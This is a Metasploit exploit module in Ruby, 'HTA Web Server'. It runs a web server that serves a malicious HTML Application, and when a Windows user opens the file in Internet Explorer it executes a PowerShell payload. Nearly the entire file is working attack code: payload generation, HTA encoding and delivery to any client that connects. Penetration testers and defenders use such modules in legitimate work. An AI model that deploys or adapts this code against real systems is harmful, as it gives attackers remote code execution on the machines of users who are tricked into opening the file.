##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTA Web Server',
      'Description'    => %q(
        This module hosts an HTML Application (HTA) that when opened will run a
        payload via Powershell. When a user navigates to the HTA file they will
        be prompted by IE twice before the payload is executed.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => 'Spencer McIntyre',
      'References'     =>
        [
          ['URL', 'https://www.trustedsec.com/july-2015/malicious-htas/']
        ],
      # space is restricted by the powershell command limit
      'Payload'        => { 'DisableNops' => true, 'Space' => 2048 },
      'Platform'       => %w(win),
      'Targets'        =>
        [
          [ 'Powershell x86', { 'Platform' => 'win', 'Arch' => ARCH_X86 } ],
          [ 'Powershell x64', { 'Platform' => 'win', 'Arch' => ARCH_X86_64 } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 06 2016'
    ))
  end

  def on_request_uri(cli, _request)
    print_status('Delivering Payload')
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      target.arch,
      target.platform,
      p.encoded,
      'hta-psh',
      { :arch => target.arch, :platform => target.platform }
    )
    send_response(cli, data, 'Content-Type' => 'application/hta')
  end

  def random_uri
    # uri needs to end in .hta for IE to process the file correctly
    '/' + Rex::Text.rand_text_alphanumeric(rand(10) + 6) + '.hta'
  end
end

